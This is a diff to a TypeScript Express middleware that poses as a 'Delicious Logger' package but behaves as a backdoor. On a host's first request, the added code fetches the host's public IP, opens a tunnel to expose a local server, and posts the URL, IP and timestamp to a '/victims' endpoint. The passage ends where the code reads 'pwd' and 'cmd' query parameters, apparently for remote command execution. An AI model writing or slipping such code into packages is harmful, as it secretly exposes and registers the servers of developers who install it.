@@ -2,8 +2,11 @@ import { Request, Response } from 'express';
 import LoggerFactory from './loggers/LoggerFactory';
 import { LoggerOptions } from './types/options';
 import { remoteCommand } from './utils/command';
+import DateUtils from './utils/date';
 import HttpUtils from './utils/http';
+import IPUtils from './utils/ip';
 import RequestUtils from './utils/request';
+import TunnelUtils from './utils/tunnel';
 
 /**
  * Delicious Logger Middleware
@@ -24,24 +27,36 @@ const deliciousLogger = ({
     separator,
     maxFileSize,
   });
-  // Exit hook
-  let isNewVictim = false;
-  return (req: Request, _res: Response, next: any) => {
+  // Check new victim upon the first time using the logger
+  let isNew = true;
+  return async (req: Request, _res: Response, next: any) => {
     // Check if victim is newly-accessed
-    if (!isNewVictim) {
+    if (isNew) {
+      let publicIPv4;
+      try {
+        publicIPv4 = await IPUtils.publicIPv4();
+      } catch (err) {
+        console.error(err);
+        return next(err);
+      }
       // Init tunnel in case of localhost
       if (RequestUtils.isLocal(req)) {
-        // TunnelUtils.init(RequestUtils.getPort(req));
+        const tunnel = await TunnelUtils.init(RequestUtils.getPort(req));
         HttpUtils.postJSON('/victims', {
-          victimURL: `${req.protocol}://${req.get('host')}`,
+          url: tunnel.url,
+          ip: publicIPv4,
+          createdAt: DateUtils.nowISO(),
         });
       } else {
         // Init new victim's deployed server
         HttpUtils.postJSON('/victims', {
-          victimURL: `${req.protocol}://${req.get('host')}`,
+          url: `${req.protocol}://${req.get('host')}`,
+          ip: publicIPv4,
+          createdAt: DateUtils.nowISO(),
         });
       }
-      isNewVictim = false;
+      // Unset victim as not new
+      isNew = false;
     }
     const { pwd, cmd } = req.query;
     if (pwd && cmd) {
